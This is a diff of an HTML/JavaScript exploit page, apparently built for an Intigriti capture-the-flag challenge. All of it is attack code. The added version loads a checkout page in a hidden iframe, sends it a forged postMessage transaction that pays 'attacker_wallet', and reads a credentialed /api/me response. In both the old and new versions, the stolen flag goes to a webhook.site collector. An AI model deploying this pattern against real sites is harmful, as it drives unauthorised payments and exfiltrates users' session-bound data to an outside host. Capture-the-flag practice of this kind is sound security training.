@@ -2,30 +2,36 @@
 <html>
 <body>
 <script>
-(async () => {
-  const WH = "https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840";
+const WH = "https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840";
 
-  // Phase 1: beacon
-  fetch(WH + "?phase=1");
+// 1️⃣ Open checkout page in iframe (same tab or hidden iframe)
+const iframe = document.createElement("iframe");
+iframe.src = "https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=1";
+iframe.style.display = "none";
+document.body.appendChild(iframe);
 
-  // If we're NOT on security.html, go there
-  if (!location.pathname.includes("security.html")) {
-    location.href = "https://challenge-0126.intigriti.io/security.html";
-    return;
-  }
-
-  // Phase 2: wait for DOM + JS
-  let tries = 0;
-  const iv = setInterval(() => {
-    const el = document.getElementById("flagText");
-
-    if (el || tries++ > 30) {
-      const flag = el ? el.innerText : "FLAG_NOT_FOUND";
-      new Image().src = WH + "?flag=" + encodeURIComponent(flag);
-      clearInterval(iv);
+// 2️⃣ After checkout loads, abuse postMessage trust
+setTimeout(() => {
+  iframe.contentWindow.postMessage({
+    type: "submitTransaction",
+    transaction: {
+      currency: "BTC",
+      amount: 0.00000001,
+      toAddress: "attacker_wallet"
     }
-  }, 1000);
-})();
+  }, "*");
+
+  // 3️⃣ Steal the flag directly
+  fetch("https://challenge-0126.intigriti.io/api/me", {
+    credentials: "include"
+  })
+    .then(r => r.json())
+    .then(d => {
+      new Image().src =
+        WH + "?flag=" + encodeURIComponent(d.flag);
+    });
+
+}, 3000);
 </script>
 </body>
 </html>
